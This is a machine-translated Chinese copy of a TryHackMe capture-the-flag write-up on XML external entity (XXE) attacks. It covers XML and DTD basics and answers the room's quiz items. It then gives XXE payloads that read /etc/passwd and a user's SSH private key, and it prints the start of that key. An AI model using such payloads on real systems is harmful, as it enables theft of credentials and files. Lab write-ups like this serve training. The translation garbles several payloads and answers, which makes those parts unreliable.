<html>
<head>
<title>XXE — TryHackme WriteUp</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">XXE——TryHackme报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/xxe-tryhackme-writeup-29fb1e0e2666?source=collection_archive---------1-----------------------#2022-01-07">https://infosecwriteups.com/xxe-tryhackme-writeup-29fb1e0e2666?source=collection_archive---------1-----------------------#2022-01-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="7279" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">XML外部实体报告</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/b11650cc111c7bae35902a136ab07e5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*kdjgO9RpgijM8lZ-"/></div></div></figure><p id="ae0a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">欢迎回来伟大的黑客我在这里另一个很酷的话题OWASP十大话题之一是XXE攻击概念。XXE代表滥用XML数据/解析器的XML外部实体。它允许黑客与后端数据进行交互。这将导致拒绝服务攻击和SSRF，在某些情况下可能导致RCE攻击。</p><p id="74d1" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir"><em class="ln">XXE攻击有带内和带外两种:</em> </strong></p><p id="cf53" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">带内:</strong>黑客注入XXE载荷后可以得到即时响应。<strong class="kt ir">坏的:</strong>web应用程序没有立即响应。</p><p id="baff" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因为我们了解了XXE漏洞，所以我们必须了解XML。</p><p id="3b08" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">什么是XML？</strong></p><p id="6157" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">XML可扩展标记语言是一种标记语言，它定义了一组规则，用于以机器可读和人类可读的格式对文档进行编码。它用于存储和传输数据。</p><p id="4975" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">我们为什么要使用XML？</strong></p><p id="4f91" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">1.因为XML是平台和编程语言不可知的，所以它可以在任何系统上使用，并且随着技术的变化而变化。</p><p id="76b0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">2.XML数据可以随时修改，而不会影响数据的外观。</p><p id="2fa1" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">3.XML支持DTD和模式验证。该验证验证XML文档中没有语法错误。</p><p id="ff5c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">4.由于其平台独立性，XML使得系统间的数据交换更加容易。在系统之间传输XML数据时，不需要转换它。</p><p id="c7f9" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">任务:</p><blockquote class="lo lp lq"><p id="9980" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir">XML的完整形式</strong></p></blockquote><p id="a8b6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">可扩展标记语言</p><blockquote class="lo lp lq"><p id="78df" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir">XML区分大小写吗？</strong></p></blockquote><p id="87d5" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">是</p><blockquote class="lo lp lq"><p id="f50c" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir">XML文档中一定要有XML prolog吗？</strong></p></blockquote><p id="39b7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">不</p><blockquote class="lo lp lq"><p id="7ec0" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">我们能根据so模式验证XML文档吗？</p></blockquote><p id="ac85" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">是</p><blockquote class="lo lp lq"><p id="d198" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">如何在XML文档中指定XML版本和编码？</p></blockquote><p id="dcf3" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">XML prolog</p><p id="cfa5" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">在开始研究XXE之前，我们需要知道XML中的DTD是什么。</p><p id="c37a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">文档类型定义(DTD)是文档类型定义的缩写。XML文档的结构允许DTD定义组件和属性。</p><blockquote class="lo lp lq"><p id="cd71" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">现在让我们看看DTD是如何验证XML的。这是便条中提到的所有术语的清单。<br/> 1。！DOCTYPE注释—定义文档的根元素，注释<br/> 2。！元素注释-这指定注释元素必须包括以下元素:"收件人、发件人、标题和正文"<br/> 3。！元素to-将元素to的类型定义为“# PC data”<br/>4。！元素来源-将来源元素的类型定义为“# PC data”<br/>5。！元素标题-将标题元素的类型定义为“# PC data”<br/>6。！元素主体—将主体元素的类型定义为“#PCDATA”。</p></blockquote><p id="405b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">任务</p><blockquote class="lo lp lq"><p id="a8ee" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">你用什么扩展名保存DTD文件？</p></blockquote><p id="7fd8" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">文档类型定义（Document Type Definition的缩写）</p><blockquote class="lo lp lq"><p id="fddf" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">你如何定义一个新元素？</p></blockquote><p id="5dc1" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">！元素</p><blockquote class="lo lp lq"><p id="2f47" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir">如何定义根元素？</strong></p></blockquote><p id="f1ab" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">！文档类型</p><blockquote class="lo lp lq"><p id="a55e" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir">如何定义一个新实体？</strong></p></blockquote><p id="83e4" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">！实体</p><p id="051b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在，我们可以通过在易受攻击的web应用程序中注入有效负载来了解XXE是如何工作的。</p><blockquote class="lo lp lq"><p id="ce5a" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir"> Ist有效载荷:</strong></p><p id="6d8d" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir"> &lt;？xml version="1.0 "？&gt; <br/> &lt;！DOCTYPE替换[ &lt;！实体名&gt;&gt;<br/>&lt;userInfo&gt;<br/>&lt;名&gt;隼&lt;/名&gt; <br/> &lt;姓&gt; &amp;名；&lt;/姓氏&gt;<br/>&lt;/userInfo&gt;</strong></p></blockquote><p id="5188" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">注入这个简单的有效载荷后，我们将知道漏洞是否在web应用程序上起作用。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/f4a9801683fd0866bbbf0d0fe7c21061.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*nQ7Ls6bjEJZ0dkGI6MXGDg.png"/></div></figure><p id="51a6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">有效载荷2:</p><p id="7044" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们尝试通过应用有效负载来读取系统文件</p><blockquote class="lo lp lq"><p id="39cb" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><code class="fe lv lw lx ly b">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;<br/>&lt;root&gt;&amp;read;&lt;/root&gt;</code></p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/506a2733cce8652c35570506767e06eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1334/format:webp/1*z35VZmZKdGZA6WagtePFSQ.png"/></div></figure><p id="c6f2" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">任务:</p><blockquote class="lo lp lq"><p id="8a98" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">/etc/passwd中的用户名是什么</p></blockquote><p id="ccbf" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">猎鹰</p><blockquote class="lo lp lq"><p id="4ec9" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated">falcon私钥的前18个字符是什么</p></blockquote><p id="9a14" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">使用的有效载荷:</p><blockquote class="lo lp lq"><p id="7d5b" class="kr ks ln kt b ku kv jr kw kx ky ju kz lr lb lc ld ls lf lg lh lt lj lk ll lm ij bi translated"><strong class="kt ir"> &lt;？xml version="1.0 "？&gt;<br/>T39】！DOCTYPE根[ &lt;！实体读取系统' file:///home/falcon/。ssh/id _ RSA '&gt;&gt;<br/>&lt;root&gt;&amp;read；&lt;/根&gt;/T17】</strong></p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/ce41d0727b777a710991ba1986f3f1fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/format:webp/1*cYTfYtXfCrymte4x9wGQJQ.png"/></div></figure><p id="9213" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">MIIEogIBAAKCAQEA7</p></div></div>    
</body>
</html>